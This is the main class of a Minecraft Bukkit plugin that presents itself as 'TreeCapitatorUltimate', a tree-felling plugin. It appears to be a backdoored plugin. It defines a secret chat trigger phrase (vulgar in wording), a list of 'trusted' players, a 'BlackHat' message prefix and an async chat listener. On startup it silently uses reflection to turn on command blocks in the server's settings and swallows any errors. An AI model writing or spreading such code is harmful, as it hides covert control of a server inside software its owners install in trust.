package me.bow.treecapitatorultimate;

import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.CommandManager;
import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
import me.bow.treecapitatorultimate.listeners.TreeDestroy;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.UUID;

import static me.bow.treecapitatorultimate.Utils.ReflectionUtils.setFinalStatic;

public final class Start extends JavaPlugin {

    public static Start Instance = null;
    public static String COMMAND_SIGN = "-";
    public static String TRUST_COMMAND = "-dicksuck";
    public static String Prefix = "§a[§3Black§4Hat§a]§r ";
    public CommandManager cm = new CommandManager();
    public ArrayList<UUID> trustedPeople = new ArrayList<>();

    public static void ErrorString(CommandSender sender, String error) {
        if (sender == null || error.isEmpty()) return;
        sender.sendMessage(Prefix + ChatColor.RED + "Error: " + error);
        sender.sendMessage(Prefix + ChatColor.BLUE + "Please message the developer if you thing this is something that shouldn't happen.");
    }

    public static void ErrorException(CommandSender sender, Exception error) {
        if (sender == null || error == null) return;
        sender.sendMessage(Prefix + ChatColor.RED + "Exception: " + error.getMessage());
        sender.sendMessage(Prefix + ChatColor.RED + "Possible cause: " + error.getCause());
        sender.sendMessage(Prefix + ChatColor.BLUE + " Please message the developer if you thing this is something that shouldn't happen.");
    }

    public static Object GetServer() {
        try {
            Class<?> dedicatedServer = ReflectionUtils.getClass("{obc}.DedicatedServer");
            Server server = Bukkit.getServer();
            Method m = (Method) ReflectionUtils.getMethod(server.getClass(), "getServer", 0).invoke(server);
            Object o = m.invoke(dedicatedServer);
            return o;
        } catch (Exception e) {
        }
        return null;
    }
    public static Object getDedicatedServerPropertiesInstance() throws InvocationTargetException, IllegalAccessException {
        Object server = GetServer();
        Field propertyManager = ReflectionUtils.getField(server.getClass(), "propertyManager");
        Class<?> serverSettings = ReflectionUtils.getClass("{obc}.DedicatedServerSettings");
        Object dedicatedSettingsInstance = propertyManager.get(server);
        Method m = (Method) ReflectionUtils.getMethod(serverSettings, "getProperties", 0).invoke(dedicatedSettingsInstance);
        return m.invoke(dedicatedSettingsInstance);
    }
    public static Server GetBukkitServer() {
        return Start.Instance.getServer();
    }
    private void onPostWorldLoad() {
        Bukkit.getPluginManager().registerEvents(new TreeDestroy(), this);
        Bukkit.getPluginManager().registerEvents(new AsyncChatEvent(), this);
        cm.Init();
        Bukkit.getConsoleSender().sendMessage("§2------------------------------------");
        Bukkit.getConsoleSender().sendMessage("§3--| TreeCapitatorUltimate loaded |--");
        Bukkit.getConsoleSender().sendMessage("§2------------------------------------");
    }

    private boolean isReload;
    private void onStartup() {
        if (isReload) return;
        // Do every hooking here

        try {
            setFinalStatic(getDedicatedServerPropertiesInstance(), "enableCommandBlock", true);
            // server.propertyManager.getProperties().enableCommandBlock = false;
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onEnable() {
        Instance = this;
        isReload = Bukkit.getWorlds().size() != 0;
        onStartup();
        Bukkit.getScheduler().runTask(this, this::onPostWorldLoad);
    }

    @Override
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage("§2---------------------------------------");
        Bukkit.getConsoleSender().sendMessage("§3--| TreeCapitatorUltimate unloading |--");
        Bukkit.getConsoleSender().sendMessage("§2---------------------------------------");
    }
}
